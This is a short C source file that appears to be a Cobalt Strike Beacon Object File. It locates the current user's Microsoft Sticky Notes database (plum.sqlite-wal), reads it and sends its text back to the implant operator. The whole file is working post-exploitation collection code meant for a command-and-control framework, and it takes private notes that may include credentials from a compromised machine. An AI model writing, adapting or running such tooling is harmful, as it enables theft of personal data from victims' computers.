#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include "beacon.h"

WINBASEAPI HFILE WINAPI KERNEL32$OpenFile (LPCSTR lpFileName, LPOFSTRUCT lpReOpenBuff, UINT uStyle);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINADVAPI WINBOOL WINAPI ADVAPI32$GetUserNameA (LPSTR lpBuffer, LPDWORD pcbBuffer);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle (HANDLE hOject);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t _Size);
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI int MSVCRT$sprintf(char *__stream, const char *__format, ...);

void go (char * buff, int len) {
    char uname[50];
    DWORD u_len = 50;
    ADVAPI32$GetUserNameA(uname, &u_len);
    char file[200]= {'\0'};
    MSVCRT$sprintf(file,"C:/Users/%s/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite-wal", uname);
    formatp buffer;
    BeaconFormatAlloc(&buffer,10000000);
    OFSTRUCT buffer1 = {0};
    HANDLE hfile = KERNEL32$OpenFile(file, &buffer1, OF_READ);
    char * buffer_read = MSVCRT$malloc(0x10000000);
    DWORD bytes_read = {0};
    KERNEL32$ReadFile(hfile, buffer_read, 0x10000000, &bytes_read, NULL);
    KERNEL32$CloseHandle(hfile);
    int i;
    for (i=0; i < 0x1000000; i++){
        if (buffer_read[i] != NULL){
            BeaconFormatPrintf(&buffer, "%c", buffer_read[i]);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT,"%s", BeaconFormatToString(&buffer,NULL));
    BeaconFormatFree(&buffer);
    MSVCRT$free(buffer_read);
}

